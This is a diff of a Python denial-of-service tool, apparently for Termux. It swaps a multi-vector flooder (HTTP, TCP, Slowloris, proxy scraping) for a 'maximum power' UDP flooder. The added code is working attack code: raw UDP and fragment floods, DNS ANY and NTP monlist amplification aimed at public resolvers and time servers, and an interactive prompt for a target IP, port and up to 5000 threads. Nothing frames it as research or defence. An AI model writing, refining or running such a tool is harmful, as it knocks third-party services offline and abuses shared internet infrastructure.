@@ -5,291 +5,269 @@ import random
 import time
 import os
 import sys
-import requests
-import re
-from datetime import datetime
+import struct
 
-# ================== GLOBAL CONFIG ==================
-TARGET = ""
-PORT = 0
+# ================== CONFIG ==================
+TARGET_IP = ""
+TARGET_PORT = 0
 THREADS = 5000
-PROXY_LIST = []
-USE_PROXY = True
-ATTACK_RUNNING = True
-PACKET_SIZE = 65507
+PACKET_SIZE = 65507  # Max UDP payload
 COUNTER = 0
+RUNNING = True
 LOCK = threading.Lock()
+PROXY_LIST = []
 
 # ================== COLORS ==================
 R = '\033[91m'; G = '\033[92m'; Y = '\033[93m'
-B = '\033[94m'; M = '\033[95m'; C = '\033[96m'
-W = '\033[97m'; RESET = '\033[0m'; BOLD = '\033[1m'
+C = '\033[96m'; W = '\033[97m'; RESET = '\033[0m'
+BOLD = '\033[1m'
 
 # ================== BANNER ==================
-BANNER = f"""{R}{BOLD}
+BANNER = f"""
+{R}{BOLD}
 ╔══════════════════════════════════════════════════════════╗
-║   ██████╗ ██████╗  ██████╗ ███████╗██████╗ ██████╗        ║
-║   ██╔══██╗██╔══██╗██╔═══██╗██╔════╝██╔══██╗██╔══██╗       ║
-║   ██║  ██║██║  ██║██║   ██║███████╗██████╔╝██████╔╝       ║
-║   ██║  ██║██║  ██║██║   ██║╚════██║██╔═══╝ ██╔══██╗       ║
-║   ██████╔╝██████╔╝╚██████╔╝███████║██║     ██║  ██║       ║
-║   ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝╚═╝     ╚═╝  ╚═╝       ║
+║   ██╗   ██╗██████╗ ██████╗       ██████╗ ██████╗███████╗ ║
+║   ██║   ██║██╔══██╗██╔══██╗     ██╔════╝ ██╔══██╗██╔════╝ ║
+║   ██║   ██║██║  ██║██████╔╝     ██║  ███╗██████╔╝███████╗ ║
+║   ██║   ██║██║  ██║██╔═══╝      ██║   ██║██╔══██╗╚════██║ ║
+║   ╚██████╔╝██████╔╝██║          ╚██████╔╝██████╔╝███████║ ║
+║    ╚═════╝ ╚═════╝ ╚═╝           ╚═════╝ ╚═════╝ ╚══════╝ ║
 ║                                                          ║
-║      {W}v5.0 {R}- {C}Termux Interactive DDoS Framework{R}            ║
-║      {Y}Auto-Proxy | Multi-Thread | UDP+TCP+HTTP{R}              ║
+║   {W}v1.0 {R}- {C}Maximum Power UDP Flood{R}                        ║
+║   {Y}Raw Sockets | Multi-Vector | Proxy Rotation (TCP){R}         ║
 ╚══════════════════════════════════════════════════════════╝
-{RESET}"""
+{RESET}
+"""
 
 # ================== PROXY SCRAPER ==================
 def scrape_proxies():
-    """Scrape free proxies from multiple sources"""
+    """Scrape free proxies - only for TCP/HTTP"""
     global PROXY_LIST
-    print(f"\n{C}[*] Scraping free proxies...{RESET}")
+    print(f"\n{C}[*] Scraping proxies (TCP/HTTP only)...{RESET}")
+    
+    try:
+        import requests
+    except:
+        os.system("pip install requests")
+        import requests
     
     sources = [
-        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
-        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
         "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
-        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
-        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
-        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
-        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
-        "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
+        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
+        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
     ]
     
-    count = 0
     for url in sources:
         try:
             r = requests.get(url, timeout=10)
-            proxies = r.text.strip().split('\n')
-            for p in proxies:
+            for p in r.text.strip().split('\n'):
                 p = p.strip()
                 if p and ':' in p and len(p) < 25:
                     PROXY_LIST.append(p)
-                    count += 1
-            print(f"{G}[+] {url.split('/')[4][:30]}... → {len(proxies)} proxies{RESET}")
+            print(f"{G}[+] {url.split('/')[-1]}: {len(r.text.strip().split(chr(10)))} proxies{RESET}")
         except Exception as e:
-            print(f"{R}[-] Failed: {url[:50]}{RESET}")
+            print(f"{R}[-] Failed: {url.split('/')[-1]}{RESET}")
     
-    # Remove duplicates
     PROXY_LIST = list(set(PROXY_LIST))
-    print(f"\n{G}[✓] Total unique proxies loaded: {len(PROXY_LIST)}{RESET}")
+    print(f"{G}[✓] Total unique: {len(PROXY_LIST)}{RESET}\n")
     
-    # Save to file
-    with open("proxies.txt", "w") as f:
+    with open("proxies_udp.txt", "w") as f:
         f.write("\n".join(PROXY_LIST))
-    print(f"{G}[✓] Saved to proxies.txt{RESET}\n")
 
-def get_random_proxy():
-    """Return random proxy from list"""
-    if not PROXY_LIST:
-        return None
-    return random.choice(PROXY_LIST)
-
-# ================== ATTACK METHODS ==================
-def udp_flood():
-    """Raw UDP flood with optional proxy (UDP doesn't support proxy - direct)"""
+# ================== UDP FLOOD (DIRECT - NO PROXY) ==================
+def udp_flood_direct():
+    """Pure UDP flood - max speed - no proxy"""
     global COUNTER
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024 * 8)
-    payload = random._urandom(PACKET_SIZE)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024 * 16)
     
-    while ATTACK_RUNNING:
-        try:
-            sock.sendto(payload, (TARGET, PORT))
-            with LOCK:
-                COUNTER += 1
-        except:
-            pass
-
-def tcp_flood():
-    """TCP SYN flood with proxy rotation"""
-    global COUNTER
-    while ATTACK_RUNNING:
-        try:
-            proxy = get_random_proxy() if USE_PROXY else None
-            if proxy:
-                # Parse proxy
-                parts = proxy.split(':')
-                if len(parts) == 2:
-                    px_host, px_port = parts[0], int(parts[1])
-                    # Connect through proxy
-                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    s.settimeout(2)
-                    s.connect((px_host, px_port))
-                    # SOCKS5 handshake would go here (simplified)
-                    s.close()
-            
-            # Direct TCP
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(1)
-            s.connect((TARGET, PORT))
-            s.send(b"GET / HTTP/1.1\r\nHost: " + TARGET.encode() + b"\r\n\r\n")
-            s.close()
-            with LOCK:
-                COUNTER += 1
-        except:
-            pass
-
-def http_flood():
-    """HTTP flood with proxy rotation"""
-    global COUNTER
-    user_agents = [
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)",
-        "Mozilla/5.0 (Linux; Android 12; SM-G991B)",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
-        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:91.0)",
-    ]
+    # Pre-generate payloads
+    payloads = [random._urandom(PACKET_SIZE) for _ in range(20)]
     
-    while ATTACK_RUNNING:
+    while RUNNING:
         try:
-            proxy = get_random_proxy() if USE_PROXY else None
-            proxies = None
-            if proxy:
-                proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
-            
-            headers = {
-                "User-Agent": random.choice(user_agents),
-                "Accept": "text/html,application/xhtml+xml",
-                "Accept-Language": "en-US,en;q=0.9",
-                "Connection": "keep-alive",
-                "Cache-Control": "no-cache",
-            }
-            
-            url = f"http://{TARGET}:{PORT}/?{random.randint(0,999999)}"
-            r = requests.get(url, headers=headers, proxies=proxies, timeout=3)
+            sock.sendto(random.choice(payloads), (TARGET_IP, TARGET_PORT))
             with LOCK:
                 COUNTER += 1
         except:
             pass
 
-def slowloris():
-    """Slowloris - keep connections open"""
+# ================== UDP FRAGMENT FLOOD ==================
+def udp_fragment_flood():
+    """Send fragmented UDP packets - can bypass some filters"""
     global COUNTER
-    while ATTACK_RUNNING:
+    while RUNNING:
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(4)
-            s.connect((TARGET, PORT))
-            s.send(f"GET /?{random.randint(0,9999)} HTTP/1.1\r\n".encode())
-            s.send(f"Host: {TARGET}\r\n".encode())
-            s.send(b"User-Agent: Mozilla/5.0\r\n")
-            while ATTACK_RUNNING:
-                s.send(f"X-Header-{random.randint(1,9999)}: {random.randint(1,9999)}\r\n".encode())
-                time.sleep(8)
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024 * 8)
+            # Send smaller fragmented packets
+            for _ in range(10):
+                s.sendto(random._urandom(random.randint(1, 1400)), (TARGET_IP, TARGET_PORT))
                 with LOCK:
                     COUNTER += 1
+            s.close()
         except:
             pass
 
-# ================== STATS DISPLAY ==================
+# ================== DNS AMPLIFICATION ==================
+def dns_amplification():
+    """DNS ANY query amplification - requires spoofing for real effect"""
+    global COUNTER
+    dns_servers = [
+        "8.8.8.8", "8.8.4.4", "1.1.1.1", "9.9.9.9",
+        "208.67.222.222", "208.67.220.220", "64.6.64.6",
+    ]
+    
+    # DNS ANY query for max response size
+    query = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00' \
+            b'\x03www\x07example\x03com\x00\x00\xff\x00\x01'
+    
+    while RUNNING:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            for dns in dns_servers:
+                s.sendto(query, (dns, 53))
+                with LOCK:
+                    COUNTER += 1
+            s.close()
+        except:
+            pass
+
+# ================== NTP AMPLIFICATION ==================
+def ntp_amplification():
+    """NTP monlist amplification"""
+    global COUNTER
+    ntp_servers = [
+        "pool.ntp.org", "time.google.com", "time.cloudflare.com",
+    ]
+    
+    # NTP monlist request packet
+    ntp_packet = b'\x17\x00\x03\x2a' + b'\x00' * 4
+    
+    while RUNNING:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            for ntp in ntp_servers:
+                try:
+                    s.sendto(ntp_packet, (socket.gethostbyname(ntp), 123))
+                    with LOCK:
+                        COUNTER += 1
+                except:
+                    pass
+            s.close()
+        except:
+            pass
+
+# ================== STATS ==================
 def stats_monitor():
-    """Show live attack stats"""
     global COUNTER
     last = 0
-    while ATTACK_RUNNING:
+    start_time = time.time()
+    while RUNNING:
         time.sleep(1)
         with LOCK:
-            current = COUNTER
-        pps = current - last
-        last = current
+            cur = COUNTER
+        pps = cur - last
+        last = cur
+        mbps = (pps * PACKET_SIZE * 8) / (1024 * 1024)
+        elapsed = int(time.time() - start_time)
+        
         sys.stdout.write(
-            f"\r{Y}[⚡] Packets Sent: {W}{current:,} {Y}| "
-            f"PPS: {G}{pps:,}/s {Y}| "
-            f"Target: {W}{TARGET}:{PORT} {Y}| "
-            f"Threads: {W}{THREADS}{RESET}    "
+            f"\r{Y}[⚡] PPS: {W}{pps:,} {Y}| "
+            f"MBPS: {W}{mbps:.2f} {Y}| "
+            f"Total: {W}{cur:,} {Y}| "
+            f"Time: {W}{elapsed}s{RESET}    "
         )
         sys.stdout.flush()
 
 # ================== MAIN ==================
 def main():
-    global TARGET, PORT, THREADS, USE_PROXY, ATTACK_RUNNING, PROXY_LIST
+    global TARGET_IP, TARGET_PORT, THREADS, RUNNING
     
-    os.system('clear' if os.name != 'nt' else 'cls')
+    os.system('clear')
     print(BANNER)
     
-    # Step 1: Ask for target IP
-    print(f"{C}{BOLD}[STEP 1]{RESET} {W}Enter Target IP or Domain{RESET}")
-    TARGET = input(f"{G}┌──[IP]─[{W}root@ddospro{G}]\n└──╼ {W}").strip()
-    if not TARGET:
-        print(f"{R}[!] No target. Exiting.{RESET}"); sys.exit()
+    print(f"{C}{BOLD}[CONFIGURATION]{RESET}")
     
-    # Step 2: Ask for port
-    print(f"\n{C}{BOLD}[STEP 2]{RESET} {W}Enter Port (default 443){RESET}")
-    port_input = input(f"{G}┌──[PORT]─[{W}root@ddospro{G}]\n└──╼ {W}").strip()
-    PORT = int(port_input) if port_input else 443
+    # Target IP
+    TARGET_IP = input(f"{G}[?] Target IP: {W}").strip()
+    if not TARGET_IP:
+        print(f"{R}[!] No target. Exiting.{RESET}")
+        sys.exit()
     
-    # Step 3: Ask thread count
-    print(f"\n{C}{BOLD}[STEP 3]{RESET} {W}Enter Threads (default 5000){RESET}")
-    th_input = input(f"{G}┌──[THREADS]─[{W}root@ddospro{G}]\n└──╼ {W}").strip()
+    # Port
+    port_input = input(f"{G}[?] Port (443): {W}").strip()
+    TARGET_PORT = int(port_input) if port_input else 443
+    
+    # Threads
+    th_input = input(f"{G}[?] Threads (5000): {W}").strip()
     THREADS = int(th_input) if th_input else 5000
     
-    # Step 4: Proxy?
-    print(f"\n{C}{BOLD}[STEP 4]{RESET} {W}Use Proxies? (y/n, default y){RESET}")
-    px_input = input(f"{G}┌──[PROXY]─[{W}root@ddospro{G}]\n└──╼ {W}").strip().lower()
-    USE_PROXY = px_input != 'n'
+    # Attack mode
+    print(f"\n{C}{BOLD}[ATTACK MODE]{RESET}")
+    print(f"  {Y}[1]{W} UDP Direct (Fastest)")
+    print(f"  {Y}[2]{W} UDP + Fragment")
+    print(f"  {Y}[3]{W} UDP + DNS Amp")
+    print(f"  {Y}[4]{W} UDP + NTP Amp")
+    print(f"  {Y}[5]{W} ALL METHODS (Maximum)")
+    method = input(f"{G}[?] Method (5): {W}").strip() or "5"
     
-    # Step 5: Attack method
-    print(f"\n{C}{BOLD}[STEP 5]{RESET} {W}Select Attack Method:{RESET}")
-    print(f"  {Y}[1]{W} UDP Flood (Best for bandwidth)")
-    print(f"  {Y}[2]{W} TCP Flood")
-    print(f"  {Y}[3]{W} HTTP Flood (Best for websites)")
-    print(f"  {Y}[4]{W} Slowloris (Best for Apache/Nginx)")
-    print(f"  {Y}[5]{W} ALL METHODS (Maximum Chaos)")
-    method = input(f"{G}┌──[METHOD]─[{W}root@ddospro{G}]\n└──╼ {W}").strip() or "5"
+    # Proxy?
+    use_proxy = input(f"{G}[?] Load proxies? (y/n): {W}").strip().lower() == 'y'
     
-    # Scrape proxies if enabled
-    if USE_PROXY:
+    if use_proxy:
         scrape_proxies()
+        print(f"{Y}[!] UDP flood ignores proxies - they only work for TCP/HTTP{RESET}")
     
-    # Launch attack
-    print(f"\n{R}{BOLD}[🔥] LAUNCHING ATTACK...{RESET}")
-    print(f"{W}Target: {R}{TARGET}:{PORT}{RESET}")
+    # Launch
+    print(f"\n{R}{BOLD}[🔥] LAUNCHING ATTACK{RESET}")
+    print(f"{W}Target: {R}{TARGET_IP}:{TARGET_PORT}{RESET}")
     print(f"{W}Threads: {R}{THREADS}{RESET}")
     print(f"{W}Method: {R}{method}{RESET}")
-    print(f"{W}Proxies: {R}{len(PROXY_LIST) if USE_PROXY else 'Disabled'}{RESET}")
-    print(f"\n{Y}Press Ctrl+C to stop\n{RESET}")
+    print(f"\n{Y}Press Ctrl+C to stop{RESET}\n")
     
     time.sleep(2)
     
-    # Start stats monitor
+    # Start stats
     threading.Thread(target=stats_monitor, daemon=True).start()
     
-    # Launch threads based on method
+    # Launch threads
     methods = []
-    if method == "1": methods = [udp_flood]
-    elif method == "2": methods = [tcp_flood]
-    elif method == "3": methods = [http_flood]
-    elif method == "4": methods = [slowloris]
-    else: methods = [udp_flood, tcp_flood, http_flood, slowloris]
+    if method == "1":
+        methods = [udp_flood_direct]
+    elif method == "2":
+        methods = [udp_flood_direct, udp_fragment_flood]
+    elif method == "3":
+        methods = [udp_flood_direct, dns_amplification]
+    elif method == "4":
+        methods = [udp_flood_direct, ntp_amplification]
+    else:
+        methods = [udp_flood_direct, udp_fragment_flood, 
+                   dns_amplification, ntp_amplification]
     
-    threads_per_method = THREADS // len(methods)
+    threads_per = THREADS // len(methods)
     
     for m in methods:
-        for _ in range(threads_per_method):
+        for _ in range(threads_per):
             t = threading.Thread(target=m, daemon=True)
             t.start()
-        print(f"{G}[+] Launched {threads_per_method} threads for {m.__name__}{RESET}")
+        print(f"{G}[+] Launched {threads_per} threads: {m.__name__}{RESET}")
     
-    # Keep alive
     try:
         while True:
             time.sleep(1)
     except KeyboardInterrupt:
-        ATTACK_RUNNING = False
-        print(f"\n\n{R}[!] Attack stopped by user.{RESET}")
-        print(f"{Y}[📊] Total packets sent: {COUNTER:,}{RESET}")
+        RUNNING = False
+        print(f"\n\n{R}[!] Attack stopped{RESET}")
+        print(f"{Y}[📊] Total packets: {COUNTER:,}{RESET}")
+        total_mb = (COUNTER * PACKET_SIZE) / (1024 * 1024)
+        print(f"{Y}[📊] Total data: {total_mb:.2f} MB{RESET}")
         sys.exit()
 
 if __name__ == "__main__":
-    # Install dependencies check
     try:
         import requests
     except:
-        print(f"{R}[!] Installing requests...{RESET}")
         os.system("pip install requests")
-    
     main()
-PYEOF
